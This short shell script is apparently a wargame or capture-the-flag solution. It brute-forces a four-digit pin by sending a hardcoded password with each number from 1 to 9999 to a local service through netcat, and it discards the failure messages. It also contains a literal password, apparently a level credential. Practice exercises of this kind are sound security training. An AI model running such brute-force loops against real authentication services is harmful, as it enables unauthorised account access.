pw=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
for i in $(seq "9999"); do
    echo $pw $i
done | nc localhost 30002 | grep -v -x "Wrong! Please enter the correct pincode. Try again."
